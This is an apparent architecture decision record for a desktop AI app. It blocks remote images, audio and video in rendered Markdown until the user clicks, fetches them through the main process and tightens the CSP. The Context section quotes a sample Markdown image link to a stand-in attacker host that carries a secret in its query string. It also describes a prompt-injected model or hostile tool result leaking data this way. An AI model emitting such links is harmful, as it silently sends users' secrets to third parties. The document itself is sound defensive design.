# ADR 0327: Click-to-load remote media in rendered Markdown

- Status: Accepted
- Date: 2026-10-12
- Deciders: PI-Desktop maintainers (security audit remediation)
- Supersedes: the "remote media is fetched on render" readability trade-off in
  [security §Renderer](../spec/05-security/01-security.md)
- Related: [ADR 0272](0272-connection-time-public-network-route.md) (public-network
  guard), [component spec §8.7](../spec/04-ux/08-component-spec.md), D169

## Context

Markdown rendered by the desktop renderer comes from sources the user does not
control: assistant replies, tool output, subagent transcripts, workspace
Markdown previews, and plugin READMEs. Until now a remote `http(s)` image,
audio or video reference in that Markdown, including raw HTML `<img>`,
`<video poster>` and `<source>`, was fetched as soon as it rendered, and the
renderer CSP admitted `https:` for `img-src` and `media-src`.

That is a zero-click exfiltration channel. A prompt-injected model, a hostile
file in the workspace, or a tool result can embed
`![](https://attacker.example/p.png?d=<secret>)` and the app sends the secret,
the user's IP and a timestamp to that host the moment the message appears. A
Mermaid diagram could do the same through `url(https://…)` in its SVG CSS.

## Decision

1. **Nothing remote loads on render.** Markdown images, audio and video whose
   `src` (or any `<source>` child) resolves to another host render as a
   placeholder chip naming the host, with the full URL in its tooltip and a
   localized "Load image/audio/video" action. Classification follows the
   browser's own URL parser, so protocol-relative, backslash, whitespace and
   scheme-without-slashes spellings are caught.
2. **One click loads one item, through Main.** The click sends that single URL
   over a new narrowly scoped invoke channel, `pi-desktop/media/fetchRemote`
   (`{ url, kind }`). Main fetches it with the existing public-network client:
   HTTPS only, public addresses only, every redirect hop re-validated, at most
   three redirects, a 15 s per-hop and 20 s overall deadline, no cookies, HTTP
   auth or shared cache (`credentials: "omit"`, `cache: "no-store"`), and no
   renderer-supplied method, headers or body. The response must be a 2xx with a
   content type in the requested family (a raster/SVG image list, `audio/*`,
   `video/*`) and at most 10 MiB for images or 25 MiB for audio/video. Main
   returns a `data:` URL; the renderer caches up to 32 loaded items (96 MiB)
   for the session so a remounted message does not ask again.
3. **The CSP enforces it.** `https:` is removed from `img-src` and `media-src`.
   The renderer can no longer reach a remote media host even if a rendering
   path is missed; the loaded bytes arrive as `data:`, which the CSP already
   admits. `script-src` and the other directives are unchanged.
4. **No `poster`.** The sanitize schema no longer admits `video[poster]`, and
   a loaded remote player uses `preload="none"`.
5. **Mermaid CSS is confined to the document.** A dedicated DOMPurify instance
   for Mermaid output carries hooks that rewrite `<style>` text and every
   attribute value so only `url(#id)` and `url(data:…)` survive; `@import`,
   `image-set()` and CSS `src()` are removed, and CSS that hides a reference
   behind escapes or comments is dropped.

No setting re-enables automatic loading. The channel is not routed to paired
remote hosts and is not exposed on the MCP control surface.

### Why a Main-process fetch instead of keeping `https:` in the CSP

Keeping `https:` and only gating the `src` in React would leave every missed
rendering path (a new component, a sanitizer gap, a plugin renderer) one
attribute away from the same leak. Routing the single clicked request through
Main reuses the public-network guard the app already ships for catalogs and
marketplaces, so the added code is small: one IPC handler, one bounded body
reader, and a placeholder component.

## Consequences

- Rendering a message, tool result, workspace Markdown preview or plugin README
  never contacts a third-party host. A click contacts only the named host (and
  hosts it redirects to), from Main, without cookies.
- Plain `http:` media, private/LAN/loopback hosts, and non-media responses do
  not load; the chip reports the failure and offers a retry. `http:` media was
  already blocked by the previous CSP.
- Renderer plugin components that relied on loading `https:` images directly
  in the main window no longer can; they must ship assets through
  `plugin-asset:` or `data:` URLs (the marketplace renderer already performed no
  remote image loads, D169).
- Persisted data, Host RPC, and the Plugin SDK are unchanged. The renderer
  bridge gains one whitelisted invoke channel.
